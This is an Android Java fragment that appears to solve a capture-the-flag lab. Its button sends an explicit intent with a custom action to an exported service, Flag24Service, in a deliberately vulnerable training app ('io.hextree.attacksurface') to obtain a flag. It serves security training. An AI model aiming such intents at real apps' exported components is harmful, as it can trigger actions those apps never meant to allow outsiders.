package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag24Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag24, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag24);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
            intent.setComponent(new ComponentName("io.hextree.attacksurface",
                    "io.hextree.attacksurface.services.Flag24Service"));
            getContext().startService(intent);
            Toast.makeText(getContext(), "Open the vulnerable app to get the flag", Toast.LENGTH_LONG).show();
        });
        return view;
    }
} 